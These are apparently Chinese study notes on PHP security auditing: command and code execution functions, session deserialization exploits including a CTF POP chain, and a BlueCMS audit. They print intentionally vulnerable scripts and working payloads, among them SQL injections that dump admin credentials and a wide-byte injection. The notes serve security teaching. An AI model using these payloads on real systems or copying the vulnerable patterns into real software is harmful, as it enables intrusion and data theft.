create_function( )是PHP中的内置函数，用于在PHP中创建匿名 (lambda-style) 函数。

用法：`string create_function ( $args, $code )`

参数：该函数接受以下两个参数

- $args:它是一个字符串类型的函数参数。 
- $code:它是字符串类型的函数代码。

注意：通常，这些参数将作为单引号分隔的字符串传递。使用单引号引起来的字符串的原因是为了防止变量名被解析，否则，将需要双引号来转义变量名，例如  \ $avar。 

返回值：此函数以字符串形式返回唯一的函数名称，否则，在错误时返回FALSE。

#### 示例

创建一个匿名函数执行

```php
<?php
$newfunc=create_function('$a,$b','return $a+$b;');
var_dump($newfunc(1,2));
```

相当于

```php
function x($a,$b){ return $a+$b; }
```

如果能在代码块输入参数控制可以使用 `}` 对语句进行闭合再加上php代码 再用`/*`注释后面内容

```http
http://127.0.0.1:8081/www.phpsec.com/code/create_function.php?str=2;}phpinfo();//
```

<img src=".\图片\Snipaste_2023-04-10_11-43-35.png" alt="Snipaste_2023-04-10_11-43-35" style="zoom:80%;" />

### $a($b)函数

由于PHP 的特性原因，PHP 的函数**支持直接由拼接的方式调用**，这直接导致了PHP 在安全上的控制有 加大了难度。不少知名程序中也用到了动态函数的写法，**这种写法跟使用 call_user_func() 的初衷 一样**，用来更加方便地调用函数，但是一旦过滤不严格就会造成代码执行漏洞。

```php
<?php
$a=$_GET['a'];
$b=$_GET['b'];
$a($b); //system('dir')
```

```http
http://127.0.0.1:8081/www.phpsec.com/code/ab.php?a=system&b=whoami
```

<img src=".\图片\Snipaste_2023-04-10_11-45-44.png" alt="Snipaste_2023-04-10_11-45-44" style="zoom:80%;" />



## 命令执行

当应用需要调用一些外部程序时**会用到一些系统命令的函数**。应用在调用这些函数执行系统命令的时候，如果将用户的输 入作为系统命令的参数拼接到命令行中，在没有过滤用户的输入情况下，会造成命令执行漏洞。

[PHP: system - Manual](https://www.php.net/manual/zh/function.system.php)

审计函数：

```php
system
passthru
exec
pcntl_exec
shell_exec
popen
proc_open
`(反单引号)
ob_start()
```

### system() 

system()：能够将字符串作为OS命令执行，自带输出功能。

`system(string $command, int &$result_code = null): string|false`

```php
<?php
$cmd = $_GET['cmd'];
if($cmd){
    echo "<pre>";
    system($cmd);
    echo "</pre>";
}
```

```http
http://127.0.0.1:8081/www.phpsec.com/cmd/system.php?cmd=whoami
```

### exec()

`exec(string $command, array &$output = null, int &$result_code = null): string|false`

```php
<?php

$cmd = $_GET['cmd'];
$output=null;
if ($cmd) {
    echo "<pre>";
    exec($cmd,$output); //默认是没有回显 需要填写第一个参数 或者使用echo 输出 默认输出最后一行
    var_dump($output); //输出全部
    echo "</pre>";
}
```

```
?cmd=whoami
```

### shell_exec 

通过 shell 执行命令并将完整的输出以字符串的方式返回

`shell_exec(string $command): string|false|null`

```php
<?php

$cmd = $_GET['cmd'];
if ($cmd) {
    echo "<pre>";
    echo shell_exec($cmd); //默认不回显 需要输出  ?cmd=whoami
    echo "</pre>";
}
```

### passthru

passthru ：执行外部程序并且显示原始输出

`passthru(string $command, int &$result_code = null): ?false`

```php
<?php

$cmd = $_GET['cmd'];
if ($cmd) {
    echo "<pre>";
    passthru($cmd); //有回显  ?cmd=whoami
    echo "</pre>";
}
```

### pcntl_exec

pcntl 是 linux下的一个扩展，可以支持php的多线程操作。 

`pcntl_exec`函数的作用是在当前进程空间执行指定程序，版本要求：PHP > 4.2.0

`pcntl_exec(string $path, array $args = [], array $env_vars = []): bool`

- path是可执行二进制文件路径或一个在文件第一行指定了 一个可执行文件路径标头的脚本 

- args是一个要传递给程序的参数的字符串数组。

```php
<?php
$path = $_GET['path'];
$args=$_GET['args'];
if ($path) {
 echo "<pre>";
 echo pcntl_exec($path,$args); //这个是linux的一个扩展
 echo "</pre>";
}
```

### popen

打开一个指向进程的管道，该进程由派生给定的 command 命令执行而产生。

`popen(string $command, string $mode): resource|false`

```php
<?php
$path = $_GET['path'];
if ($path) {
 echo "<pre>";
 echo popen($path, 'r');
 echo "</pre>";
}
```

### proc_open

 执行一个命令，并且打开用来输入/输出的文件指针。

[程序执行函数 proc_open 执行一个命令，并且打开用来输入/输出的文件指针](http://www.canquick.com/article/function.proc-open.html)

### `(反单引号) 

跟shell_exec效果一样

在php中称之为执行运算符，PHP 将尝试将反引号中的内容作为 shell 命令来执行，并将其输出信息返回（即，可以赋给 一个变量而不是简单地丢弃到标准输出，使用反引号运算符  “`”  的效果与函数 shell_exec() 相同。

```php
<?php
$cmd = $_GET['cmd'];
if($cmd){
    echo "<pre>";
    echo  `$cmd`;    // ?cmd=whoami
    echo "</pre>";
}
```

### ob_start

`ob_start(callable $callback = null, int $chunk_size = 0, int $flags = PHP_OUTPUT_HANDLER_STDFLAGS): bool`

此函数将打开输出缓冲。当输出缓冲激活后，脚本将不会输出内容（除http标头外），相反需要输出的内容被存储在内部 缓冲区中。想要输出存储在内部缓冲区中的内容，可以使用 ob_end_flush() 函数。

可选参数 output_callback 函数可以被指定。 此函数把一个字符串当作参数并返回一个字符串。 当输出缓冲区被( ob_flush(), ob_clean() 或者相似的函数)冲刷（送出）或者被清洗的时候；或者在请求结束之际输出缓冲区内容被冲刷到 浏览器的时候该函数将会被调用。 当调用 output_callback 时，它将收到输出缓冲区的内容作为参数 并预期返回一个新 的输出缓冲区作为结果，这个新返回的输出缓冲区内容将被送到浏览器。

下面的代码，由于调用了ob_end_flush()，所以会调用ob_start(cmd)中的cmd，把我们输入的 _GET[a] 作为 cmd 的参数。

```php
<?php
 $cmd = 'system';
 ob_start($cmd);
 echo "$_GET[a]";  // ?a=whoami
 ob_end_flush();
?>
```

### 常用命令学习

在代码审计中 发现命令执行漏洞 通常需要闭合或者改变它的运行顺序 可以使用命令连接符

```
Windows和Linux都支持的命令连接符：
cmd1 | cmd2 只执行cmd2
cmd1 || cmd2 只有当cmd1执行失败后，cmd2才被执行
cmd1 & cmd2 先执行cmd1，不管是否成功，都会执行cmd2
cmd1 && cmd2 先执行cmd1，cmd1执行成功后才执行cmd2，否则不执行cmd2
Linux还支持分号（;），cmd1;cmd2 按顺序依次执行，先执行cmd1再执行cmd2
```



## 反序列化漏洞

序列化：就是将一个对象转换成字符串，字符串包括，属性名、属性值、属性类型和该对象对应的类名 

反序列化：则相反将字符串重新恢复成对象

| 类型     | 过程         |
| -------- | ------------ |
| 序列化   | 对象->字符串 |
| 反序列化 | 字符串->对象 |

对象的序列化利于对象的 保存和传输 ，也可以让多个文件共享对象。ctf很多题型也都是考察PHP反序列化的相关知识。

## SESSION反序列化

### 基础

#### 相关配置

在php.ini中存在三项配置项：

- session.save_path="" --设置session的存储路径
- session.save_handler="" –设定用户自定义session存储函数，如果想使用PHP内置会话存储机制之外的可以使用本 函数(数据库等方式)
- session.auto_start boolen --指定会话模块是否在请求开始时启动一个会话，默认为0不启动
- session.serialize_handler string –定义用来序列化/反序列化的处理器名字。默认使用php (php<5.5.4) 以上的选项就是与PHP中的Session 存储 和 序列化存储 有关的选项。

在使用phpsutdy组件安装中，上述的配置项的设置如下：

- session.save_path="D:\phpstudy_pro\Extensions\tmp\tmp" 表明所有的session文件都是存储在phpstudy/tmp下
- session.save_handler=files 表明session是以文件的方式来进行存储的
- session.auto_start=0 表明默认不启动session
- session.serialize_handler=php 表明session的默认序列化引擎使用的是php序列话引擎 在上述的配置中，session.serialize_handler是用来设置session的序列化引擎的，除了默认的PHP引擎之外，还存在其他引擎，不同的引擎所对应的session的存储方式不相同。

#### php序列化引擎

| 引擎                     | session存储方式                                              |
| ------------------------ | ------------------------------------------------------------ |
| php(php<5.5.4)           | 存储方式是，键名+\|竖线+经过serialize()函数序列处理的 值（只序列化值） |
| php_serialize(php>5.5.4) | 存储方式是，经过serialize()函数序列化处理的键和值（将 session中的key和value都会进行序列化） |
| php_binary               | 存储方式是，键名的长度对应的ASCII字符+键名+经过 serialize()函数序列化处理的值 |

在PHP (php<5.5.4) 中默认使用的是`PHP`引擎，如果要修改为其他的引擎，只需要添加代码 `ini_set ('session.serialize_handler', '需要设置的引擎名');` 进行设置。

示例代码如下：

```php
<?php
ini_set('session.serialize_handler', 'php_serialize'); //设置序列化引擎使用php_serialize
session_start();
// do something
......
```

#### 引擎存储机制

php中的session中的内容并不是放在内存中的，而**是以文件的方式来存储的**，存储方式就是由配置项 `session. save_handler`来 进行确定的，默认是以文件的方式存储。

存储的文件是以`sess_sessionid(PHPSESSID)`来进行命名的，文件的内容就是 session 值经过 serialize() 函数序列化之后的内容。

假设我们的环境是phpsutdy，那么默认配置如上所述。

**在默认配置情况下（在php引擎下）：**

```php
<?php
ini_set('session.serialize_handler', 'php');   // 设置序列化引擎使用php //name|s:7:"moonsec";
session_start();       // 启动新会话或者重用现有会话
$_SESSION['name'] = 'moonsec';
```

<img src=".\图片\Snipaste_2023-04-10_15-36-37.png" alt="Snipaste_2023-04-10_15-36-37" style="zoom:67%;" />

可以看到 `PHPSESSID` 的值是 `8fe43p5u98mqek0i3umlvjga01`，所以在 `D:\phpstudy_pro\Extensions\tmp\tmp`下存储的文件名是`sess_8fe43p5u98mqek0i3umlvjga01`，文件的内容是 `name|s:7:"moonsec";` 。`name` 是键值，`name|s:7:" moonsec";` 是`serialize("moonsec")` 的结果。

php引擎方式存储：**键名+竖线 |+经过serialize()函数序列处理的值**

**在php_binary引擎下：php_serialize引擎下：**

```php
<?php
ini_set('session.serialize_handler', 'php_serialize');   // 设置序列化引擎使用php_serialize //a:1:{s:4:"name";s:7:"moonsec";}
session_start();       // 启动新会话或者重用现有会话
$_SESSION['name'] = 'moonsec';
```

`SESSION`文件的内容是 `a:1:{s:4:"name";s:7:"moonsec";}` 。`a:1`是使用 php_serialize 进行序列话都会加上。同时使用 php_serialize 会将 session 中的key(键)和value(值)都会进行序列化。

**在php_binary引擎下：**

存储方式是，键名的长度对应的`ASCII字符+键名+经过serialize()函数序列化处理的值`

```php
<?php
//设置序列化引擎使用php_binary //names:7:"moonsec";
ini_set('session.serialize_handler', 'php_binary'); 
session_start();
$_SESSION['name'] = 'moonsec';
```

SESSION文件的内容是 `names:7:"moonsec";` 。由于name的长度是4，4在ASCII表中对应的就是EOT（这个）。根据 php_binary的存储规则，最后就是 `names:7:"moonsec";` 。

(突然发现ASCII的值为4的字符无法在网页上面显示，这个大家自行去查ASCII表吧)

<img src=".\图片\Snipaste_2023-04-10_15-50-00.png" alt="Snipaste_2023-04-10_15-50-00" style="zoom:80%;" />

### Session序列化漏洞利用

#### 前置演示

```php
<?php
class syclover
{
    var $func = "";

    function __construct()
    {     // __construct()在实例化是被调用
        $this->func = "phpinfo()";
    }

    function __wakeup()
    {
        eval($this->func); //"echo 'moonsec';"
    }
}
var_dump(unserialize($_GET['str']));
/*$obj=new syclover();
$obj->func="echo 'moonsec';";
echo serialize($obj);*/
```

`unserialize($_GET['str'])` 对传入的参数进行了反序列化。我们可以通过传入一个特定的字符串，反序列化为 syclove r的一个实例，那么就可以执行 `eval()` 方法。

```http
demo.php?str=O:8:"syclover":1:{s:4:"func";s:14:"echo "spoock";";} 
```

<img src=".\图片\Snipaste_2023-04-10_16-02-28.png" alt="Snipaste_2023-04-10_16-02-28" style="zoom:80%;" />

但当我们传入 `O:8:"syclover":1:{s:4:"func";s:15:"echo 'moonsec';";}` 时，最后页面输出的就是 moonsec，说明最后执行了我们定义的 `echo "moonsec";` 方法。 这就是一个简单的序列化的漏洞的演示

<img src=".\图片\Snipaste_2023-04-10_16-06-07.png" alt="Snipaste_2023-04-10_16-06-07" style="zoom:80%;" />

<img src=".\图片\Snipaste_2023-04-10_16-08-04.png" alt="Snipaste_2023-04-10_16-08-04" style="zoom:80%;" />

#### Session中的序列化危害

PHP中的Session的实现是没有的问题的，危害主要是由于程序员的Session使用不当而引起的。

**如果设置的session序列化选择器与默认的不同的话就可能会产生漏洞（会导致数据无法正确的反序列化）。**

通过精心构造的数据包，就可以绕过程序的验证或者是执行一些系统的方法。例如:

```
a:1:{s:6:"spoock";s:24:"|O:11:"PeopleClass":0:{}";}
```

上述的$_SESSION的数据如果使用 `php_serialize` 引擎，那么最后的存储的内容就是

```
a:1:{s:6:"spoock";s:24:"|O:11:"PeopleClass":0:{}";} 
```

但是我们在进行读取的时候，如果选择的是php，那么最后读取的内容是：

```
array (size=1)
 'a:1:{s:6:"spoock";s:24:"' =>
object(__PHP_Incomplete_Class)#1 (1) {
 ["__PHP_Incomplete_Class_Name"]=>
 string(11) "PeopleClass"
}
```

**这是因为当使用php引擎的时候，php引擎会以竖杠 | 作为作为key(键)和value(值)的分隔符，那么就会将 a:1:{s:6: “spoock”;s:24:" 作为SESSION的key(键)，将 O:11:“PeopleClass”:0:{} 作为value(值)，然后进行反序列化，最后就会得到 PeopleClas这个类。** 

这种由于序列化和反序列化所使用的不一样的引擎就是造成PHP Session序列话漏洞的原因。

#### 实际利用

存在us1.php和us2.php这两个文件，2个文件所使用的SESSION的引擎不一样，就形成了一个漏洞。

s1.php，使用 php_serialize 引擎来处理 session：

```php
<?php

ini_set('session.serialize_handler', 'php_serialize');
session_start();
$_SESSION["spoock"] = $_GET["a"];
```

us2.php，使用 php 引擎来处理 session：

```php
<?php
ini_set('session.serialize_handler', 'php');//?a=|O:5:"lemon":1:{s:2:"hi";s:14:"echo "spoock";";}
session_start();

class lemon {
    var $hi;
    function __construct(){
        $this->hi = 'phpinfo();';
    }

    function __destruct() {
        eval($this->hi);
    }
}

//以下为构造pop，修改 $this->hi = 'phpinfo();' 为  $this->hi = 'echo "spoock";'   构造
/*$obj=new lemon();
// O:5:"lemon":1:{s:2:"hi";s:10:"phpinfo();";}
echo serialize($obj);*/
```

此题在 us1.php 中有可以传入 session 的点，所以就不用构造表单了，这题的突破点在哪里，没错，就是我备注的那块 s2. php 中`ini_set('session.serialize_handler', 'php');`，选择 session 序列化处理器。



当访问 us1.php 时，提交如下的数据并存储到session文件中：

```http
/us1.php?a=|O:5:"lemon":1:{s:2:"hi";s:14:"echo "spoock";";}
```

<img src=".\图片\Snipaste_2023-04-10_16-28-36.png" alt="Snipaste_2023-04-10_16-28-36" style="zoom:80%;" />

再当访问 us2.php 时，发现我们打印了 spoock。

因为程序会按照php来反序列化SESSION中的数据，此时就会反序列化伪造的数据，就会实例化 lemon 对象，最后就会执行析构函数中的eval()方法。

<img src=".\图片\Snipaste_2023-04-10_16-26-22.png" alt="Snipaste_2023-04-10_16-26-22" style="zoom:80%;" />

session_start() 说明：

```
session_start() 会创建新会话或者重用现有会话。 如果通过 GET 或者 POST 方式，或者使用 cookie 提交了会话 ID， 则会重
用现有会话。
当会话自动开始或者通过 session_start() 手动开始的时候， PHP 内部会调用会话管理器的 open 和 read 回调函数。 会话管
理器可能是 PHP 默认的， 也可能是扩展提供的（SQLite 或者 Memcached 扩展）， 也可能是通过
session_set_save_handler() 设定的用户自定义会话管理器。 通过 read 回调函数返回的现有会话数据（使用特殊的序列化格式
存储）， PHP 会自动反序列化数据并且填充 $_SESSION 超级全局变量。
```

[PHP: session_start - Manual](https://www.php.net/manual/zh/function.session-start.php)



总结：

1、在存储 session 时，php_serialize 来处理 session（默认设置时，看phpinfo页面） 

2、使用 session 时，使用 php 处理 session。 

3、什么时候反序列化 session 对象，记住当使用 session_start() 函数的时候，就会自动反序列化 session 文件中的对象。



### Session.upload_progress反序列化

```
php版本>=5.4
session.upload_progress.enabled = on
session.upload_progress.cleanup=off
session.upload_progress.prefix="upload_progress_"
session.upload_progress.name = "PHP_SESSION_UPLOAD_PROGRESS"
session.serialize_handler = php_serialize
```

- 第二个 `enabled=on` 就表明了upload_progress 处于开启状态。也意味着当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中。


- 第三个 `cleanup = on` 表示当文件上传结束后，php将会立即清空对应session文件中的内容，这个选项非常重要。如果不 是off的话，得写个脚本对发送攻击包当时PHPSESSID条件竞争才能成功。


- 因为在session存储库中上传进度的文件在 sess_PHPSESSID，如果是 on，得写个脚本设置PHPSESSID为发送是的id。例如发送payload时的PHPSESSID=123，我们的脚本设置PHPSESSID为123，那么当页面源码session_start()读取时会读 取sess_123的文件，最后成功利用引擎差异进行反序列化。


- 第四个 `prefix = "upload_progress_"`  和 第五个 name 拼接 将表示为session中的键名。 name的值是可控的。


- 第六个就是要求的存储session的引擎和读取的引擎不一致了




总的来说，通过php.ini配置session.upload_progress之后，文件上传时，就会创建key为`session.upload_progress.prefix+session.upload_progress.name` 的 Session。其中 `session.upload_progress.prefix` 是配置文件中定义的， `session.upload_progress.name` 需要在form表单提交时，一并提交才可以。

#### CTF例题

在安恒杯中的一道题目就考察了这个知识点。题目中的关键代码如下：

index.php：

```php
<?php
ini_set('session.serialize_handler', 'php');
require("./class.php");

session_start();
var_dump($_SESSION);

$obj = new foo1();
$obj->varr = "phpinfo.php";
```

class.php:

```php
<?php

class foo1{
    public $varr;
    function __construct(){
        $this->varr = "index.php";
    }
    function __destruct(){
        if(file_exists($this->varr)){
            echo "<br>文件".$this->varr."存在<br>";
        }
        echo "<br>这是foo1的析构函数<br>";
    }
}

class foo2{
    public $varr;
    public $obj;
    function __construct(){
        $this->varr = '1234567890';
        $this->obj = null;
    }
    function __toString(){
        $this->obj->execute();
        return $this->varr;
    }
    function __desctuct(){
        echo "<br>这是foo2的析构函数<br>";
    }
}

class foo3{
    public $varr;
    function execute(){
        eval($this->varr);
    }
    function __desctuct(){
        echo "<br>这是foo3的析构函数<br>";
    }
}
```

通过代码发现，我们最终是要通过foo3中的 `execute()` 来执行我们自定义的函数。 那么我们首先在本地搭建环境，构造我们需要执行的自定义的函数。如下：

```php
<?php
class foo1{
    public $varr;
    function __construct(){
        $this->varr = "index.php";
    }
    function __destruct(){
        if(file_exists($this->varr)){
            echo "<br>文件".$this->varr."存在<br>";
        }
        echo "<br>这是foo1的析构函数<br>";
    }
}

class foo2{
    public $varr;
    public $obj;
    function __construct(){
        $this->varr = '1234567890';
        $this->obj = null;
    }
    function __toString(){
        $this->obj->execute();//调用到 foo3里面的 execute
        return $this->varr;
    }
    function __desctuct(){
        echo "<br>这是foo2的析构函数<br>";
    }
}

class foo3{
    public $varr;
    function execute(){
        eval($this->varr);
    }
    function __desctuct(){
        echo "<br>这是foo3的析构函数<br>";
    }
}

$foo3=new foo3();
$foo3->varr="phpinfo();";
$foo2=new foo2();
$foo2->obj=$foo3;
$foo1=new foo1();
$foo1->varr=$foo2;
echo serialize($foo1);
//O:4:"foo1":1:{s:4:"varr";O:4:"foo2":2:{s:4:"varr";s:10:"1234567890";s:3:"obj";O:4:"foo3":1:{s:4:"varr";s:10:"phpinfo();";}}}
```

在 foo1 中的构造函数中定义 $varr 的值为 foo2 的实例，在 foo2 中定义 $obj 为 foo3 的实例，在 foo 3中定义 $varr 的值为 echo “spoock” 。最终得到的序列化的值是

```
O:4:"foo1":1:{s:4:"varr";O:4:"foo2":2:{s:4:"varr";s:10:"1234567890";s:3:"obj";O:4:"foo3":1:{s:4:"varr";s:14:"echo
"spoock";";}}}
```

这样当上面的序列话的值写入到服务器端，然后再访问服务器的index.php，最终就会执行我们预先定义的echo “spoock”;的方法了。因为题中session_start();表示创建或重用已有的session，我们把存在漏洞的session写入到服务器端，然后再访问服务器的index.php，index.php会重用服务器中那个已有的存在漏洞的session。



此题没有可以反序列化的点，没有可以传入session的点，那么我们怎么改变或传入session呢。写入的方式主要是利用 `PHP中Session Upload Progress` 来进行设置，具体为，在上传文件时，如果同时POST一个与php.ini中 PHP_SESSION_UPLOAD_PROGRESS同名的变量，当PHP检测到这种POST请求时，它会在$_SESSION中添加一组数据，即就可以将filename的值赋值到session中，所以可以通过Session Upload Progress 来设置 session。由phpinfo()页面知，`session.upload_progress.enabled为On`，那么上传的页面的写法如下：

```html
<form action="index.php" method="POST" enctype="multipart/form-data">
 <input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="123" />
 <input type="file" name="file" />
 <input type="submit" />
</form>
```

```
利用前面的upload.html页面随便上传一个东西，抓包，在包中把表单 name="PHP_SESSION_UPLOAD_PROGRESS" 的 value改为如下：
|O:4:"foo1":1:{s:4:"varr";O:4:"foo2":2:{s:4:"varr";s:10:"1234567890";s:3:"obj";O:4:"foo3":1:{s:4:"varr";s:10:"phpinfo();";}}}
```



为防止转义，在引号前加上反斜杠\。最后就会将文件名写入到session中，具体的实现细节可以参 考PHP手册。 注意与本地反序列化不一样的地方是要在最前方加上| ，因为这是php引擎的格式。

参考：https://www.jb51.net/article/107101.htm 

如果session.upload_progress.cleanup=On的情况下需要竞争提交，就是 burp 设置爆破模块一直访问



## 通用代码审计思路

### 逆向追踪

根据敏感关键字回溯参数传递过程（逆向追踪）：

- 检查敏感函数的参数，进行回溯变量，判断变量是否可控并且没有经过严格的过滤，这是一个逆向追踪的过程。
- 寻找可控参数，正向追踪变量传递过程(正向追踪)•跟踪传递的参数，判断是否存入到敏感函数内或者传递的过程中具有 代码逻辑漏洞。
- 寻找敏感功能点，通读功能点代码(直接挖掘功能点漏洞)•根据自身经验判断在该应用中的哪些功能可能出现漏洞。
- •直接通读全文代码

### 审计方向

#### 功能点

根据功能点审计：根据业务的功能来进行审计。

用浏览器进行浏览，找到程序有哪些功能，阅读指定功能点的源代码。

缺点：不够全面

常见功能点：文件上传，搜索，登录，注册，留言，文件管理，文件资源下载，会员中心，人才招聘，订单管理，广告管 理，图片展示，密码修改，网站参数设置，模板管理，登录日志，文章编辑，头像上传，在线升级，数据库备份，用户权 限分配，管理数据库，投票系统。

#### 敏感函数回溯审计

敏感函数回溯审计：根据敏感的函数，去逆向参数传递的过程的审计方法。

大多数漏洞的产生原因都是因为函数的使用不当导致的，只要我们能找到这些使用不当的函数，就能快速的挖掘漏洞。 当然我们也需要去了解函数的一些特性，函数实现的功能。

缺点：误报率高

```php
代码执行：eval，assert，preg_replace，create_function()，array_map()，call_user_fun()，call_user_array，
array_filter，usort，uasort
命令执行：system，shell_exec,passthru,exec，反引号``,popen
文件包含：include，require、require_once，include_once
文件操作：copy、file_get_contents、file_put_contents、file、fopen、move_uploaded_file、readfile、rename、
rmdir、unlink敏感函数回溯审计
```

通读全文代码

PHP开发过程中无非分两种，依赖框架开发，不依赖框架开发。一般不依赖框架开发的目录结构

### 审计要点

1. **函数集文件**，通常命名包含function或者common等关键字，这些文件里面是一些公共的函数，提供其他文件统一调 用，所以大多数文件都会在文件头部包含到其他文件。寻找这些文件一个非常好用的技巧就是去打开index.php或者一些 功能性文件，在头部一般都能找到。
2. **配置文件**，通常命名中包括config关键字，配置文件包括web程序运行必须的功能性配置选项以及数据库等配置信 息。从这个文件中可以了解程序的小部分功能，另外看这个文件的时候注意观察配置文件中参数值是单引号还是用双引号 括起来，如果是双引号可能就存在代码执行的问题了。
3. **安全过滤文件**，安全过滤文件对代码审计至关重要，这关系到我们挖掘到的可以点能否直接利用，通常命名中带有 filter、safe、check等关键字，这类文件主要是对参数进行过滤，大多数的应用其实会在参数的输入做一下addslashes() 函数的过滤。(addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。)
4. **index文件**，index是一个程序的入口，所以通常我们只要读一读index文件就可以大致了解整个程序的架构、运行的流 程、包含到的文件，其中核心的文件有哪些。而不同目录的index

文件也有不同的实现方式，建议最好将几个核心目录的index文件都通读一遍。



# BlueCMS审计

## 前台漏洞

### SQL注入

在 ad_js.php 里，重要代码如下：

```php
<?php

$ad_id = !empty($_GET['ad_id']) ? trim($_GET['ad_id']) : '';
if(empty($ad_id))
{
   echo 'Error!';
   exit();
}

$ad = $db->getone("SELECT * FROM ".table('ad')." WHERE ad_id =".$ad_id);
```

这里直接拼接字符串导致 sql 注入

#### 寻找过程

方法一：Seay自动审计，找到可能存在sql注入的地方

方法二：Seay插件mysql监控，浏览网站，找到mysql执行了的sql语句，再到源码里验证

方法三：phpStorm 里寻找源码中有关sql注入的函数，如 `select、where、update` 等之类的

方法四：从cms的功能点寻找，哪里可能存在有关数据库交互的功能

#### 漏洞验证

```http
http://127.0.0.1:8081/bluecms/ad_js.php?ad_id=-1%20union%20select%201,2,3,4,5,6,user()
```

数字型注入，拼接后的sql语句为：`SELECT * FROM blue_ad WHERE ad_id =-1 union select 1,2,3,4,5,6,user()`

<img src=".\图片\Snipaste_2023-04-11_13-04-52.png" alt="Snipaste_2023-04-11_13-04-52" style="zoom: 80%;" />

### XFF头SQL注入

#### 漏洞寻找

`comment.php` 里有SQL语句，看看变量我们是否能控制，重要代码如下：

```php
$sql = "INSERT INTO ".table('comment')." (com_id, post_id, user_id, type, mood, content, pub_date, ip, is_check) VALUES ('', '$id', '$user_id', '$type', '$mood', '$content', '$timestamp', '".getip()."', '$is_check')";

$db->query($sql);
```

根进 `getip()` 函数，在 `include/comment.fun.php` 里：

```php
function getip()
{
	if (getenv('HTTP_CLIENT_IP'))
	{
		$ip = getenv('HTTP_CLIENT_IP'); 
	}
	elseif (getenv('HTTP_X_FORWARDED_FOR')) 
	{ //获取客户端用代理服务器访问时的真实ip 地址
		$ip = getenv('HTTP_X_FORWARDED_FOR');
	}
	elseif (getenv('HTTP_X_FORWARDED')) 
	{ 
		$ip = getenv('HTTP_X_FORWARDED');
	}
	elseif (getenv('HTTP_FORWARDED_FOR'))
	{
		$ip = getenv('HTTP_FORWARDED_FOR'); 
	}
	elseif (getenv('HTTP_FORWARDED'))
	{
		$ip = getenv('HTTP_FORWARDED');
	}
	else
	{ 
		$ip = $_SERVER['REMOTE_ADDR'];
	}
	return $ip;
}
```

从源码中发现 `HTTP_CLIENT_IP` 和 `HTTP_X_FORWARDED` 是可以**从客户端进行修改**。源码中没有对客户端获取ip进行过 滤 所以存在SQL注入。

#### 漏洞验证

##### 方法一：

注册用户访问 `comment.php?act=send&id=1` 添加 X-FORWARDED-FOR 输入单引号 看到

```http
POST /comment.php?act=send&id=1 HTTP/1.1
Host: www.blue123.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=s6r0lj2at8pfsug33enccccse4; BLUE[user_id]=2; BLUE[user_name]=moonsec; BLUE[user_pwd]
=55bd036b26f4b5d4285334ef4852a21c; detail=5
Upgrade-Insecure-Requests: 1
X-FORWARDED-FOR: 111.111.111'
Content-Length: 31
Content-Type: application/x-www-form-urlencoded

comment=asdadsadsadadcommentasd
```

出现语句报错信息可以使用SQL报错注入获取敏感信息。但是 `include\mysql.class.php` 中的 `query` 只输出SQL语句 并不 会把报错注入获取得内容输出

```php
function query($sql){
 if(!$query=@mysql_query($sql, $this->linkid)){
 $this->dbshow("Query error:$sql");
 }else{
 return $query;
 }
 }
```

```http
POST /comment.php?act=send&id=1 HTTP/1.1
Host: www.blue123.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=s6r0lj2at8pfsug33enccccse4; BLUE[user_id]=2; BLUE[user_name]=moonsec; BLUE[user_pwd]
=55bd036b26f4b5d4285334ef4852a21c; detail=5
Upgrade-Insecure-Requests: 1
X-FORWARDED-FOR: 2' and extractvalue(1,concat(0x7e,database())) and '
Content-Length: 31
Content-Type: application/x-www-form-urlencoded

comment=asdadsadsadadcommentasd
```

在mysql执行语句可以报错查询到当前得数据库名：

<img src=".\图片\Snipaste_2023-04-11_15-38-31.png" alt="Snipaste_2023-04-11_15-38-31" style="zoom:80%;" />

##### 方法二：

还可以使用 `insert` 注入 因为显示的内容是 content 所以将SQL注入回显的结果在content字段内。

```
X-Forwarded-For:1','1'),('','1','1','0','0',(database()),'1','1
X-Forwarded-For:1','1'),('','1','1','0','0',(select concat(admin_name,":",pwd) from blue_admin),'1','1
```

这样拼接的sql语句为：

```sql
INSERT INTO blue_comment (com_id, post_id, user_id, TYPE, mood, content, pub_date, ip, is_check) VALUES ('', '1', '1',
'0', '0', 'asdadsadsadadcommentasd', '1675873553', '1','1'),('','1','1','0','0',(DATABASE()),'1','1', '1');
```

<img src=".\图片\Snipaste_2023-04-11_15-51-51.png" alt="Snipaste_2023-04-11_15-51-51" style="zoom:80%;" />

访问 `http://www.blue123.com/comment.php?id=1&type=0` 查询评论内容

<img src=".\图片\Snipaste_2023-04-11_15-39-55.png" alt="Snipaste_2023-04-11_15-39-55" style="zoom: 67%;" />

### GBK宽字节注入

#### 原理

查看 `/data/config.php` 里，设置的**数据库默认编码是gbk2312**，而且**输入的单引号会进行转义**，因此带入到SQL执行里所以存在宽字节注入。

```php
<?php
$dbhost   = "localhost";
$dbname   = "bluecms";
$dbuser   = "root";
$dbpass   = "root";
$pre    = "blue_";
$cookiedomain = '';
$cookiepath = '/';
define('BLUE_CHARSET','gb2312');  //设置的数据库默认编码是gbk2312
define('BLUE_VERSION','v1.6');
?>
```

查看用户登录的 `user.php`，登录的 sql 语句为 ：

```php
$row = $db->getone("SELECT COUNT(*) AS num FROM ".table('admin')." WHERE admin_name='$user_name'");
```

宽字节注入 gbk编码 字符型注入经过 addslashes

```
%df%27===>(addslashes)====>%df%5c%27====>(GBK)====>運’
```

#### 漏洞验证

```http
POST:  user_name=%df'%20or%20sleep(10)%23
```

<img src=".\图片\Snipaste_2023-04-12_14-30-33.png" alt="Snipaste_2023-04-12_14-30-33" style="zoom:80%;" />

